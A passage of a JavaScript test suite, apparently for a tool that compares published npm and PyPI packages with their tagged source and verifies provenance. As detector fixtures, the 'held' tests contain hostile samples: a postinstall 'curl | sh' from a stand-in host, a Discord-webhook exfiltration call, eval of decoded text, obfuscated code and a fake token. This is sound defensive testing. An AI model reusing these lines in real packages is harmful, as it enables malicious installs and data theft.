// release-diff: archive reading, provenance, tags, the comparison and the
// lane end to end, on crafted packages and recorded registry answers. No
// network: every fetch is mocked.

import { test } from 'node:test';
import assert from 'node:assert/strict';
import { createHash } from 'node:crypto';
import { mkdtempSync, readFileSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';

import { makeTgz, makeZip } from '../../test/archive-fixtures.mjs';
import { createCache, createHttp, FetchProblem, readCapped } from '../lib/http.mjs';
import { npmProvenance, pypiProvenance } from '../lib/provenance.mjs';
import { lsRefsBody, parseLsRefs, readGitRefs } from '../lib/gitrefs.mjs';
import { compareArtifact, comparePackageJson, compareTomlText, eggInfoOnly, indexByBase, onlyVersionLines } from '../lib/diff.mjs';
import { createSourceIndex, scanIndicators } from '../lib/indicators.mjs';
import { allowedUrl, choosePackages, collectSubject, guardHttp, HostRefused, resolveTag, skipOf, subjectOutput } from '../release-diff.mjs';
import { laneOf } from '../lanes.mjs';
import { runShard } from '../run.mjs';
import { forgeryControl, knownAnswerControl } from '../controls.mjs';
import { judgeItem, pinnedRegistry, runKey } from './helpers.mjs';

const FIX = new URL('./fixtures/provenance/', import.meta.url);
const sha256 = (b) => createHash('sha256').update(b).digest('hex');
const sha512i = (b) => `sha512-${createHash('sha512').update(b).digest('base64')}`;
const C = 'c'.repeat(40);
const D = 'd'.repeat(40);

// ---------------------------------------------------------------- a mocked world

/** A fetch over routes { method?, prefix, status?, body (object | string | Buffer), headers? }; first match wins. */
function mockFetch(routes) {
  const calls = [];
  const f = async (url, init = {}) => {
    const method = (init.method ?? 'GET').toUpperCase();
    calls.push({ url, method, redirect: init.redirect });
    const r = routes.find((x) => (x.method ?? 'GET') === method && url.startsWith(x.prefix));
    if (!r) return new Response('not found', { status: 404 });
    const body = Buffer.isBuffer(r.body) ? r.body : typeof r.body === 'string' ? r.body : JSON.stringify(r.body ?? {});
    return new Response(r.status === 302 || r.status === 301 ? null : body, { status: r.status ?? 200, headers: r.headers ?? {} });
  };
  f.calls = calls;
  return f;
}

const pkt = (lines) => Buffer.from(lines.map((l) => (Buffer.byteLength(`${l}\n`) + 4).toString(16).padStart(4, '0') + `${l}\n`).join('') + '0000');
const http = (fetch) => createHttp({ fetch, cache: createCache(), retries: 0, sleep: async () => {} });

/** files map {path: text} -> tgz under a top folder. */
const tgzOf = (top, files) => makeTgz(Object.entries(files).map(([p, d]) => ({ name: `${top}/${p}`, data: d, mode: p.endsWith('.sh') ? 0o755 : 0o644 })));

/** An npm subject acme/tool, package acme-tool@1.0.0, tag v1.0.0 -> C, source at C. */
function npmWorld({ pkg, src, tags = [[`${D} refs/tags/v1.0.0 peeled:${C}`]], doc = {}, extra = [] }) {
  const tarball = tgzOf('package', pkg);
  const source = tgzOf(`tool-${C}`, src);
  return mockFetch([
    ...extra,
    { prefix: 'https://registry.npmjs.org/acme-tool/latest', body: { name: 'acme-tool', version: '1.0.0', gitHead: C, repository: { url: 'git+https://github.com/acme/tool.git' }, dist: { tarball: 'https://registry.npmjs.org/acme-tool/-/acme-tool-1.0.0.tgz', integrity: sha512i(tarball) }, ...doc } },
    { prefix: 'https://registry.npmjs.org/acme-tool/-/', body: tarball },
    { method: 'POST', prefix: 'https://github.com/acme/tool.git/git-upload-pack', body: pkt([`${C} HEAD symref-target:refs/heads/main`, ...tags.flat()]) },
    { prefix: `https://codeload.github.com/acme/tool/tar.gz/${C}`, body: source },
  ]);
}
const NPM_SEED = new Map([['acme/tool', [{ registry: 'npm', identifier: 'acme-tool' }]]]);
const PKG_JSON = JSON.stringify({ name: 'acme-tool', version: '1.0.0', main: 'dist/index.js', scripts: { build: 'tsc' }, repository: { url: 'git+https://github.com/acme/tool.git' } }, null, 2);
const SRC_JSON = JSON.stringify({ name: 'acme-tool', version: '1.0.0', main: 'dist/index.js', scripts: { build: 'tsc' }, repository: { url: 'git+https://github.com/acme/tool.git' } }, null, 2);

const kinds = (c) => c.findings.map((f) => f.kind).sort();

// ---------------------------------------------------------------- provenance

test('provenance: npm SLSA provenance of @isokron/mcp-check 1.3.1 verifies offline, with the commit and tag it was built from', () => {
  const att = JSON.parse(readFileSync(new URL('npm-isokron-mcp-check-1.3.1.json', FIX), 'utf8'));
  const o = { name: '@isokron/mcp-check', version: '1.3.1', integrity: 'sha512-xThSEI0vlSwCEmRIxnZMaUlxFFjq1KSB/PsoO9LE2X5aY1moI8QI0cSu84miAi7htllVLV+uppsV0Szs7gEzfA==', repo: 'isokron-ai/mcp-check' };
  assert.deepEqual(npmProvenance(att, o), { present: true, verified: true, why: null, signer: 'repository_workflow', commit: '5e2668aed07efeb61beb2f3761bc3348af2075c3', ref: 'refs/tags/v1.3.1' });
  assert.equal(npmProvenance(att, { ...o, repo: 'someone/else' }).why, 'provenance_other_repository');
  assert.equal(npmProvenance(att, { ...o, integrity: `sha512-${Buffer.alloc(64, 1).toString('base64')}` }).why, 'provenance_other_artifact');
  const bad = structuredClone(att);
  const slsa = bad.attestations.find((a) => a.predicateType === 'https://slsa.dev/provenance/v1');
  const sig = Buffer.from(slsa.bundle.dsseEnvelope.signatures[0].sig, 'base64');
  sig[sig.length - 5] ^= 1;
  slsa.bundle.dsseEnvelope.signatures[0].sig = sig.toString('base64');
  assert.equal(npmProvenance(bad, o).why, 'signature_invalid');
  assert.deepEqual(npmProvenance({ attestations: [] }, o), { present: false, verified: false, why: 'no_provenance', signer: null, commit: null, ref: null });
});

test('provenance: the PyPI PEP 740 attestation of mcp-write-safety-kit 0.1.0 verifies offline, with its commit', () => {
  const doc = JSON.parse(readFileSync(new URL('pypi-mcp-write-safety-kit-0.1.0-wheel.json', FIX), 'utf8'));
  const o = { filename: 'mcp_write_safety_kit-0.1.0-py3-none-any.whl', sha256: 'dc15e9b41ed0c0e564c383d0a244ad4cad810f33d8c685259e0e1ee6671cf7cc', repo: 'isokron-ai/mcp-write-safety-kits' };
  const p = pypiProvenance(doc, o);
  assert.equal(p.verified, true);
  assert.equal(p.commit, '45e35044400254a4de121b52f2e2856e765536c2');
  assert.equal(p.ref, 'refs/tags/py-v0.1.0');
  assert.equal(pypiProvenance(doc, { ...o, sha256: '0'.repeat(64) }).why, 'provenance_other_artifact');
  assert.equal(pypiProvenance(doc, { ...o, repo: 'other/repo' }).why, 'provenance_other_repository');
});

// ---------------------------------------------------------------- tags

test('git refs: ls-refs answers are parsed (annotated tags peeled, HEAD symref), and a missing repository is data', async () => {
  assert.match(lsRefsBody(), /^0014command=ls-refs\n/);
  assert.ok(lsRefsBody().endsWith('0000'));
  const r = parseLsRefs(pkt([`${C} HEAD symref-target:refs/heads/main`, `${D} refs/tags/v1.0.0 peeled:${C}`, `${C} refs/tags/light`, 'garbage line']));
  assert.equal(r.head, C);
  assert.equal(r.head_ref, 'refs/heads/main');
  assert.deepEqual(r.tags.get('v1.0.0'), { object: D, commit: C, annotated: true });
  assert.deepEqual(r.tags.get('light'), { object: C, commit: C, annotated: false });
  assert.equal(r.unreadable, 1);
  assert.throws(() => parseLsRefs(pkt(['ERR denied'])));
  const f = mockFetch([{ method: 'POST', prefix: 'https://github.com/gone/repo.git', status: 401, body: '' }, { method: 'POST', prefix: 'https://github.com/old/name.git', status: 301, body: '', headers: { location: 'https://github.com/new/name.git/git-upload-pack' } }]);
  assert.deepEqual(await readGitRefs(http(f), 'gone/repo'), { status: 'not_found' });
  assert.deepEqual(await readGitRefs(http(f), 'old/name'), { status: 'not_found' }, 'a moved repository is read again at its new place (here: gone)');
  assert.ok(f.calls.every((c) => c.redirect === 'manual'), 'redirects are never followed');
});

test('tags: exact, name- folder- and ecosystem-prefixed matches are strong; a bare suffix is weak; none is null', () => {
  const t = (names) => new Map(names.map((n, i) => [n, { object: String(i).repeat(40).slice(0, 40), commit: C, annotated: false }]));
  assert.equal(resolveTag(t(['v1.2.3', 'x-v1.2.3']), { name: 'a', version: '1.2.3' }).match, 'exact');
  assert.equal(resolveTag(t(['1.2.3']), { name: 'a', version: '1.2.3' }).name, '1.2.3');
  assert.deepEqual(resolveTag(t(['@scope/pkg@1.2.3']), { name: '@scope/pkg', version: '1.2.3' }).match, 'name_prefixed');
  assert.equal(resolveTag(t(['pkg-v1.2.3']), { name: '@scope/pkg', version: '1.2.3' }).match, 'name_prefixed');
  assert.equal(resolveTag(t(['tiny/v1.2.3']), { name: '@s/other', version: '1.2.3', folder: 'tiny' }).match, 'name_prefixed');
  assert.equal(resolveTag(t(['py-v0.1.0']), { name: 'kit', version: '0.1.0', ecosystem: 'pypi' }).match, 'ecosystem_prefixed');
  assert.equal(resolveTag(t(['py-v0.1.0']), { name: 'kit', version: '0.1.0', ecosystem: 'npm' }).match, 'weak', 'a Python tag is not the npm package\'s');
  assert.equal(resolveTag(t(['a-v0.1.0', 'b-v0.1.0']), { name: 'kit', version: '0.1.0' }).match, 'weak_ambiguous');
  assert.equal(resolveTag(t(['v1.2.30', 'v11.2.3']), { name: 'a', version: '1.2.3' }), null);
  assert.equal(resolveTag(t(['v1x2y3']), { name: 'a', version: '1.2.3' }), null, 'dots in the version are literal');
  assert.equal(resolveTag(null, { name: 'a', version: '1' }), null);
});

// ---------------------------------------------------------------- the comparison

/** compareArtifact on {path: text} maps. */
function cmp({ ecosystem = 'npm', kind = 'npm_tarball', version = '1.0.0', pkg, src, hint = null, modes = {} }) {
  const fm = (o) => new Map(Object.entries(o).map(([p, d]) => {
    const data = Buffer.isBuffer(d) ? d : Buffer.from(d);
    return [p, { path: p, size: data.length, mode: modes[p] ?? 0o644, sha256: sha256(data), data }];
  }));
  const files = fm(src);
  const index = createSourceIndex();
  for (const f of files.values()) index.add(f.data.toString('utf8'));
  return compareArtifact({ ecosystem, kind, version, files: fm(pkg), archive: { links: [], refused: [], duplicates: [], others: [] } }, { files, byBase: indexByBase([...files.keys()]), index }, { hint });
}

test('diff: identical files, line endings, build output, compiled output, copied docs and copied bytes are explained', () => {
  const r = cmp({
    pkg: {
      'package.json': PKG_JSON, 'index.js': 'a\r\nb\r\n', 'dist/index.js': 'compiled', 'cli.js': 'from ts', 'cli.d.ts': 'types',
      'README.md': '# root readme', 'examples/plan.yaml': 'copied: true\n',
    },
    src: {
      'packages/tool/package.json': SRC_JSON, 'packages/tool/index.js': 'a\nb\n', 'packages/tool/cli.ts': 'source', 'README.md': '# root readme',
      'examples/tool/plan.yaml': 'copied: true\n',
    },
  });
  assert.equal(r.summary.source_folder, 'packages/tool');
  assert.equal(r.summary.identical, 1);
  assert.equal(r.summary.identical_eol, 1);
  assert.deepEqual(r.summary.explained, [{ reason: 'build_output', count: 1 }, { reason: 'compiled_output', count: 2 }, { reason: 'copied_from_repo', count: 2 }]);
  assert.equal(r.summary.unexplained_absent + r.summary.unexplained_differs, 0);
  assert.deepEqual(r.findings, []);
  assert.deepEqual(r.held, []);
});

test('diff: an executable file the source does not have is a high unexpected_file; a differing source file is content_differs', () => {
  const r = cmp({
    pkg: { 'package.json': PKG_JSON, 'index.js': 'module.exports = 2;\n', 'tools/helper.sh': '#!/bin/sh\necho hi\n', 'notes.txt': 'n' },
    src: { 'package.json': SRC_JSON, 'index.js': 'module.exports = 1;\n' },
    modes: { 'tools/helper.sh': 0o755 },
  });
  const byKind = Object.fromEntries(r.findings.map((f) => [`${f.kind}:${f.path}`, f]));
  assert.equal(byKind['unexpected_file:tools/helper.sh'].level, 'high');
  assert.equal(byKind['unexpected_file:tools/helper.sh'].executable, true);
  assert.equal(byKind['unexpected_file:notes.txt'].level, 'medium');
  assert.equal(byKind['content_differs:index.js'].level, 'high');
  assert.equal(byKind['content_differs:index.js'].source_sha256, sha256('module.exports = 1;\n'));
  assert.equal(r.summary.unexplained_absent, 2);
  assert.equal(r.summary.unexplained_differs, 1);
});

test('diff: a version stamped into a file is explained; other changed lines are not', () => {
  assert.equal(onlyVersionLines('x\nexport const VERSION = "1.4.0";\n', 'x\nexport const VERSION = "0.0.0";\n', '1.4.0'), true);
  assert.equal(onlyVersionLines('x\nfetch("https://evil")\n', 'x\nok()\n', '1.4.0'), false);
  const r = cmp({ pkg: { 'package.json': PKG_JSON, 'version.js': 'module.exports = "1.0.0";\n' }, src: { 'package.json': SRC_JSON, 'version.js': 'module.exports = "0.0.0-development";\n' } });
  assert.deepEqual(r.summary.explained, [{ reason: 'version_stamp', count: 1 }]);
});

test('diff: install scripts: present is medium; added at publish (not in the source manifest) is high, with the manifest change', () => {
  const withScript = (o) => JSON.stringify({ ...JSON.parse(PKG_JSON), scripts: { ...JSON.parse(PKG_JSON).scripts, ...o } }, null, 2);
  let r = cmp({ pkg: { 'package.json': withScript({ postinstall: 'node setup.js' }), 'setup.js': 'x' }, src: { 'package.json': withScript({ postinstall: 'node setup.js' }), 'setup.js': 'x' } });
  assert.deepEqual(r.findings.map((f) => [f.kind, f.script, f.in_source, f.level]), [['install_script', 'postinstall', true, 'medium']]);
  r = cmp({ pkg: { 'package.json': withScript({ preinstall: 'node x.js' }), 'x.js': 'y' }, src: { 'package.json': SRC_JSON } });
  const k = Object.fromEntries(r.findings.map((f) => [f.kind, f]));
  assert.equal(k.install_script.in_source, false);
  assert.equal(k.install_script.level, 'high');
  assert.deepEqual(k.manifest_differs.changes, [{ key: 'scripts.preinstall', change: 'added', explained: null, level: 'high' }]);
  assert.equal(k.unexpected_file.path, 'x.js');
  assert.equal(k.unexpected_file.level, 'high', 'a file an install script runs');
  // binding.gyp means npm runs node-gyp at install.
  r = cmp({ pkg: { 'package.json': PKG_JSON, 'binding.gyp': '{}' }, src: { 'package.json': SRC_JSON, 'binding.gyp': '{}' } });
  assert.deepEqual(r.findings.map((f) => [f.kind, f.implicit, f.in_source]), [['install_script', 'binding.gyp', true]]);
});

test('diff: package.json changes: npm and publishConfig keys and workspace protocols are explained; an added dependency is high', () => {
  const pub = { name: 'a', version: '2.0.0', gitHead: C, main: 'dist/x.js', dependencies: { left: '^1.0.0', inner: '^2.0.0', added: '^9.9.9' }, devDependencies: {} };
  const src = { name: 'a', version: '0.0.0-development', main: 'src/x.ts', publishConfig: { main: 'dist/x.js' }, dependencies: { left: '^1.0.0', inner: 'workspace:^' }, devDependencies: { ts: '5' } };
  const { changes } = comparePackageJson(pub, src);
  const open = changes.filter((c) => !c.explained);
  assert.deepEqual(open, [{ key: 'dependencies.added', change: 'added', explained: null, level: 'high' }]);
  assert.ok(changes.some((c) => c.key === 'dependencies.inner' && c.explained === 'workspace_protocol'));
  assert.ok(changes.some((c) => c.key === 'main' && c.explained === 'publish_config'));
  assert.ok(changes.some((c) => c.key === 'version' && c.explained === 'version_stamp'));
  assert.ok(changes.some((c) => c.key === 'devDependencies.ts' && c.explained === 'removed_at_publish'));
});

test('diff: PyPI sdist: generated metadata and setuptools\' setup.cfg are explained; setup.py and a changed build-system are reported', () => {
  assert.equal(eggInfoOnly('[egg_info]\ntag_build = \ntag_date = 0\n\n'), true);
  assert.equal(eggInfoOnly('[metadata]\nname = x\n'), false);
  const pyproj = '[build-system]\nrequires = ["setuptools"]\nbuild-backend = "setuptools.build_meta"\n\n[project]\nname = "kit"\nversion = "1.0.0"\n';
  const r = cmp({
    ecosystem: 'pypi', kind: 'sdist', version: '1.0.0',
    pkg: {
      'PKG-INFO': 'Metadata-Version: 2.4', 'kit.egg-info/PKG-INFO': 'x', 'setup.cfg': '[egg_info]\ntag_build = \ntag_date = 0\n\n',
      'pyproject.toml': pyproj.replace('setuptools.build_meta', 'backend').replace('requires = ["setuptools"]', 'requires = ["setuptools"]\nbackend-path = ["."]'),
      'setup.py': 'import subprocess\nfrom setuptools import setup\nsubprocess.run(["make"])\nsetup()\n', 'src/kit/__init__.py': 'x = 1\n',
    },
    src: { 'py/pyproject.toml': pyproj, 'py/src/kit/__init__.py': 'x = 1\n' },
  });
  assert.equal(r.summary.source_folder, 'py');
  assert.deepEqual(r.summary.explained, [{ reason: 'generated_metadata', count: 3 }, { reason: 'manifest', count: 1 }]);
  const k = Object.fromEntries(r.findings.map((f) => [f.kind, f]));
  assert.deepEqual(k.manifest_differs.changes.map((c) => [c.key, c.level]), [['build-system', 'high']]);
  assert.equal(k.in_tree_build_backend.level, 'medium');
  assert.deepEqual([k.setup_py_executes.in_source, k.setup_py_executes.custom_code], [false, ['process_spawn']]);
  assert.equal(k.unexpected_file.path, 'setup.py');
  assert.equal(compareTomlText('[project]\nversion = "1.0.0"\n', '[project]\nversion = "0.0.0"\n', '1.0.0').changes[0].explained, 'version_stamp');
});

test('diff: a wheel votes a folder per top-level package, explains dist-info and native builds, and reports a .pth that imports', () => {
  const r = cmp({
    ecosystem: 'pypi', kind: 'wheel', version: '1.0.0',
    pkg: {
      'kit/__init__.py': 'x = 1\n', 'kit/core.py': 'y = 2\n', 'kit_cli/main.py': 'z = 3\n', 'kit/_speed.cpython-312-x86_64-linux-gnu.so': Buffer.from([0x7f, 0x45, 0x4c, 0x46, 0, 0, 1]),
      'kit-1.0.0.dist-info/METADATA': 'm', 'kit-1.0.0.dist-info/RECORD': 'r', 'kit_hook.pth': 'import kit_cli\n',
    },
    src: { 'src/kit/__init__.py': 'x = 1\n', 'src/kit/core.py': 'y = 2\n', 'src/kit/_speed.c': 'int x;', 'tools/kit_cli/main.py': 'z = 3\n' },
  });
  assert.equal(r.summary.identical, 3, 'kit/ from src/, kit_cli/ from tools/');
  assert.deepEqual(r.summary.explained, [{ reason: 'compiled_extension', count: 1 }, { reason: 'generated_metadata', count: 2 }]);
  const pth = r.findings.find((f) => f.kind === 'pth_file');
  assert.deepEqual([pth.path, pth.import_line, pth.level], ['kit_hook.pth', true, 'high']);
});

test('diff: links, unsafe entries, duplicates and special entries in the archive are findings; no overlap at all is one too', () => {
  const files = new Map([['a.js', { path: 'a.js', size: 1, mode: 0o644, sha256: sha256('a'), data: Buffer.from('a') }]]);
  const r = compareArtifact({ ecosystem: 'npm', kind: 'npm_tarball', version: '1', files, archive: { links: [{ path: 'l', type: 'symlink' }], refused: [{ name: '../x', reason: 'unsafe_path' }], duplicates: ['a.js'], others: [{ path: 'dev', type: 'device' }] } }, { files: new Map() });
  assert.deepEqual(kinds(r), ['duplicate_entry', 'link_in_package', 'no_source_overlap', 'special_entry', 'unexpected_file', 'unsafe_entry_refused']);
  assert.equal(r.findings.find((f) => f.kind === 'unsafe_entry_refused').level, 'high');
});

// ---------------------------------------------------------------- security-class: held, never public

const OBFUSCATED = Array.from({ length: 40 }, (_, i) => `var _0x${(0x1a2b + i).toString(16)}=_0x${(0x3c4d + i).toString(16)}[${i}];`).join('');

test('held: what looks malicious is held (class S) with rule ids only, and left out of every public finding and count', () => {
  const evilInstall = JSON.stringify({ ...JSON.parse(PKG_JSON), scripts: { postinstall: 'curl -s https://x.example/p.sh | sh' } });
  const r = cmp({
    pkg: {
      'package.json': evilInstall,
      'index.js': 'module.exports = 1;\n',
      'lib/loader.js': OBFUSCATED, // unexplained-by-source obfuscation (lib/ is build output, but the source has no such code)
      'stats.js': 'require("https").get("https://discord.com/api/webhooks/123456/abc")', // not in the source at all
      'dist/bundle.js': 'eval(atob("Y29uc29sZS5sb2coMSk="))',
      '.env': 'TOKEN=x',
      'dist/config.js': 'const t = "ghp_' + 'a'.repeat(36) + '";',
    },
    src: { 'package.json': SRC_JSON, 'index.js': 'module.exports = 1;\n' },
  });
  const held = Object.fromEntries(r.held.map((h) => [h.path, h]));
  assert.deepEqual(Object.keys(held).sort(), ['.env', 'dist/bundle.js', 'dist/config.js', 'lib/loader.js', 'package.json', 'stats.js']);
  assert.deepEqual(held['lib/loader.js'].indicators, ['js_obfuscator_identifiers']);
  assert.deepEqual(held['stats.js'].indicators, ['exfiltration_endpoint']);
  assert.deepEqual(held['dist/bundle.js'].indicators, ['eval_of_decoded_text']);
  assert.deepEqual(held['.env'].indicators, ['secret_file_name']);
  assert.deepEqual(held['dist/config.js'].indicators, ['secret:github-token']);
  assert.deepEqual(held['package.json'].indicators, ['download_and_execute', 'install_script:postinstall']);
  // Nothing public names them, and no count includes them.
  const pub = JSON.stringify([r.summary, r.findings]);
  for (const p of Object.keys(held)) if (p !== 'package.json') assert.ok(!pub.includes(p), `${p} is not in public output`);
  assert.ok(!pub.includes('discord') && !pub.includes('ghp_') && !pub.includes('atob'));
  assert.ok(!r.findings.some((f) => f.kind === 'install_script' || f.kind === 'manifest_differs'), 'the held install script is not a public finding');
  assert.deepEqual(r.summary.install_scripts, []);
  assert.equal(r.summary.files, 1, 'only index.js is counted');
  assert.equal(r.summary.identical, 1);
  // The held record carries rule ids and digests, never matched text.
  assert.ok(!JSON.stringify(r.held).includes('discord') && !JSON.stringify(r.held).includes('ghp_'));
});

test('held: an indicator the source itself has is not held (a security tool\'s own rules, a minifier\'s own eval)', () => {
  const rules = 'const WEBHOOK = /discord\\.com\\/api\\/webhooks/; // https://discord.com/api/webhooks/123456/abc\n';
  const r = cmp({
    pkg: { 'package.json': PKG_JSON, 'dist/rules.js': rules, 'dist/obf.js': OBFUSCATED },
    src: { 'package.json': SRC_JSON, 'src/rules.ts': rules, 'test/fixture.js': OBFUSCATED },
  });
  assert.deepEqual(r.held, []);
  assert.equal(scanIndicators('x').strong.length, 0);
});

// ---------------------------------------------------------------- the lane, one subject

test('collect: a clean npm release: tag, source at the tag, every file identical or explained, no finding', async () => {
  const f = npmWorld({ pkg: { 'package.json': PKG_JSON, 'index.js': 'x', 'dist/index.js': 'y' }, src: { 'package.json': SRC_JSON, 'index.js': 'x', 'src/index.ts': 'y' } });
  const c = await collectSubject(http(f), 'acme/tool', { seed: NPM_SEED });
  assert.deepEqual(c.skips, []);
  assert.equal(c.artifacts.length, 1);
  const a = c.artifacts[0];
  assert.deepEqual([a.outcome, a.linked_by, a.tag.name, a.tag.match, a.basis.kind, a.basis.commit, a.provenance.why], ['compared', 'repository_field', 'v1.0.0', 'exact', 'tag', C, 'no_provenance']);
  assert.deepEqual(c.findings, []);
  assert.deepEqual(c.summaries[0].explained, [{ reason: 'build_output', count: 1 }]);
  // Every request went to an allowed host, downloads without following redirects.
  assert.ok(f.calls.every((x) => allowedUrl(x.url)));
  assert.ok(f.calls.filter((x) => /tgz|codeload/.test(x.url)).every((x) => x.redirect === 'manual'));
});

test('collect: no tag for the version is a finding; the source then comes from gitHead; a tag on another commit than gitHead is one too', async () => {
  let c = await collectSubject(http(npmWorld({ pkg: { 'package.json': PKG_JSON }, src: { 'package.json': SRC_JSON }, tags: [] })), 'acme/tool', { seed: NPM_SEED });
  assert.deepEqual(kinds(c), ['no_matching_tag']);
  assert.equal(c.artifacts[0].basis.kind, 'git_head');
  const E = 'e'.repeat(40);
  c = await collectSubject(http(npmWorld({ pkg: { 'package.json': PKG_JSON }, src: { 'package.json': SRC_JSON }, tags: [[`${D} refs/tags/v1.0.0 peeled:${C}`]], doc: { gitHead: E } })), 'acme/tool', { seed: NPM_SEED });
  assert.deepEqual(kinds(c), ['tag_commit_differs_from_git_head']);
  assert.equal(c.artifacts[0].basis.commit, C, 'the comparison uses the tag');
});

test('collect: a commit the repository does not have, a missing repository and an unlinked package are data, not skips', async () => {
  // gitHead names a commit codeload does not know.
  let f = npmWorld({ pkg: { 'package.json': PKG_JSON }, src: { 'package.json': SRC_JSON }, tags: [], doc: { gitHead: 'e'.repeat(40) } });
  let c = await collectSubject(http(f), 'acme/tool', { seed: NPM_SEED });
  assert.equal(c.artifacts[0].outcome, 'source_commit_not_found');
  assert.ok(kinds(c).includes('source_commit_not_found'));
  assert.deepEqual(c.skips, []);
  f = npmWorld({ pkg: { 'package.json': PKG_JSON }, src: {}, extra: [{ method: 'POST', prefix: 'https://github.com/acme/tool.git', status: 401, body: '' }] });
  c = await collectSubject(http(f), 'acme/tool', { seed: NPM_SEED });
  assert.equal(c.artifacts[0].outcome, 'source_repository_not_found');
  // A package whose metadata names another repository, with no provenance: not ours to compare, nothing downloaded.
  f = npmWorld({ pkg: { 'package.json': PKG_JSON }, src: {}, doc: { repository: { url: 'https://github.com/other/place' } } });
  c = await collectSubject(http(f), 'acme/tool', { seed: NPM_SEED });
  assert.equal(c.artifacts[0].outcome, 'not_linked_to_subject');
  assert.ok(!f.calls.some((x) => x.url.includes('/-/') || x.url.includes('codeload')));
});

test('downloads stay on the registry host: a tarball URL elsewhere is not fetched, a redirect is not followed, a digest mismatch is not read', async () => {
  let f = npmWorld({ pkg: { 'package.json': PKG_JSON }, src: {}, doc: { dist: { tarball: 'https://evil.example/acme-tool-1.0.0.tgz', integrity: `sha512-${Buffer.alloc(64).toString('base64')}` } } });
  let c = await collectSubject(http(f), 'acme/tool', { seed: NPM_SEED });
  assert.equal(c.artifacts[0].outcome, 'artifact_url_elsewhere');
  assert.ok(!f.calls.some((x) => x.url.includes('evil.example')));
  f = npmWorld({ pkg: { 'package.json': PKG_JSON }, src: {}, extra: [{ prefix: 'https://registry.npmjs.org/acme-tool/-/', status: 302, headers: { location: 'https://evil.example/x.tgz' } }] });
  c = await collectSubject(http(f), 'acme/tool', { seed: NPM_SEED });
  assert.equal(c.artifacts[0].outcome, 'artifact_redirected');
  assert.deepEqual(c.skips, [{ stage: 'npm', reason: 'upstream_unavailable', fault: 'tool', retryable: true }], 'a redirect we do not follow is a retryable skip with a fault side');
  assert.ok(!f.calls.some((x) => x.url.includes('evil.example')));
  f = npmWorld({ pkg: { 'package.json': PKG_JSON }, src: {}, doc: { dist: { tarball: 'https://registry.npmjs.org/acme-tool/-/acme-tool-1.0.0.tgz', integrity: `sha512-${Buffer.alloc(64).toString('base64')}` } } });
  c = await collectSubject(http(f), 'acme/tool', { seed: NPM_SEED });
  // A digest mismatch is held (R-RD-19), not a retryable skip; the public record only says it was not verified.
  assert.equal(c.artifacts[0].outcome, 'artifact_not_found');
  assert.deepEqual(c.skips, []);
  assert.deepEqual(c.held.map((h) => h.indicators), [['integrity_mismatch']]);
  // The guard itself: no host outside the list, no plain HTTP, no port or credentials.
  assert.throws(() => guardHttp(http(f)).request('https://example.com/'), HostRefused);
  for (const u of ['http://registry.npmjs.org/x', 'https://registry.npmjs.org:8443/x', 'https://u:p@registry.npmjs.org/x', 'https://registry.npmjs.org.evil.example/x']) assert.equal(allowedUrl(u), false, u);
});

test('collect: our own caps are skips with fault tool and are not retried; passing problems are retried', async () => {
  // A header that declares 10 GiB: refused at the header, before any data.
  const big = makeTgz([{ name: 'package/zeros', declaredSize: 10 * 1024 ** 3, data: '' }], { end: false });
  const f = npmWorld({ pkg: { 'package.json': PKG_JSON }, src: { 'package.json': SRC_JSON }, extra: [
    { prefix: 'https://registry.npmjs.org/acme-tool/latest', body: { name: 'acme-tool', version: '1.0.0', gitHead: C, repository: 'https://github.com/acme/tool', dist: { tarball: 'https://registry.npmjs.org/acme-tool/-/acme-tool-1.0.0.tgz', integrity: sha512i(big) } } },
    { prefix: 'https://registry.npmjs.org/acme-tool/-/', body: big },
  ] });
  const c = await collectSubject(http(f), 'acme/tool', { seed: NPM_SEED });
  assert.equal(c.artifacts[0].outcome, 'too_large');
  assert.deepEqual(c.skips, [{ stage: 'npm', reason: 'too_large', fault: 'tool' }]);
  assert.deepEqual(skipOf('x', 'rate_limited'), { stage: 'x', reason: 'rate_limited', fault: 'infra', retryable: true });
  assert.deepEqual(skipOf('x', 'reader_limit'), { stage: 'x', reason: 'reader_limit', fault: 'tool' });
  const g = mockFetch([{ prefix: 'https://api.deps.dev/', status: 503, body: '' }]);
  const d = await collectSubject(http(g), 'acme/tool', {});
  assert.deepEqual(d.skips, [{ stage: 'depsdev', reason: 'upstream_unavailable', fault: 'infra', retryable: true }]);
});

test('collect: PyPI: the sdist and the py3-none-any wheel are both compared against the tag\'s source', async () => {
  const sdist = tgzOf('kit-1.0.0', { 'PKG-INFO': 'Metadata-Version: 2.4', 'pyproject.toml': '[project]\nname = "kit"\n', 'src/kit/__init__.py': 'x = 1\n' });
  const wheel = makeZip([{ name: 'kit/__init__.py', data: 'x = 1\n' }, { name: 'kit-1.0.0.dist-info/METADATA', data: 'm' }, { name: 'kit/run', data: '/bin/sh', mode: 0o120777 }]);
  const f = mockFetch([
    { prefix: 'https://pypi.org/pypi/kit/json', body: { info: { name: 'kit', version: '1.0.0', project_urls: { Source: 'https://github.com/acme/kit' } }, urls: [
      { filename: 'kit-1.0.0.tar.gz', packagetype: 'sdist', size: sdist.length, digests: { sha256: sha256(sdist) }, url: 'https://files.pythonhosted.org/packages/aa/kit-1.0.0.tar.gz' },
      { filename: 'kit-1.0.0-cp312-cp312-manylinux_x86_64.whl', packagetype: 'bdist_wheel', size: 1, digests: { sha256: '0'.repeat(64) }, url: 'https://files.pythonhosted.org/packages/bb/x.whl' },
      { filename: 'kit-1.0.0-py3-none-any.whl', packagetype: 'bdist_wheel', size: wheel.length, digests: { sha256: sha256(wheel) }, url: 'https://files.pythonhosted.org/packages/cc/kit-1.0.0-py3-none-any.whl' },
    ] } },
    { prefix: 'https://files.pythonhosted.org/packages/aa/', body: sdist },
    { prefix: 'https://files.pythonhosted.org/packages/cc/', body: wheel },
    { method: 'POST', prefix: 'https://github.com/acme/kit.git/git-upload-pack', body: pkt([`${C} refs/tags/v1.0.0`]) },
    { prefix: `https://codeload.github.com/acme/kit/tar.gz/${C}`, body: tgzOf(`kit-${C}`, { 'pyproject.toml': '[project]\nname = "kit"\n', 'src/kit/__init__.py': 'x = 1\n' }) },
  ]);
  const c = await collectSubject(http(f), 'acme/kit', { seed: new Map([['acme/kit', [{ registry: 'pypi', identifier: 'kit' }]]]) });
  assert.deepEqual(c.artifacts.map((a) => [a.artifact, a.filename, a.outcome, a.linked_by, a.basis.kind]), [
    ['sdist', 'kit-1.0.0.tar.gz', 'compared', 'project_urls', 'tag'], ['wheel', 'kit-1.0.0-py3-none-any.whl', 'compared', 'project_urls', 'tag']]);
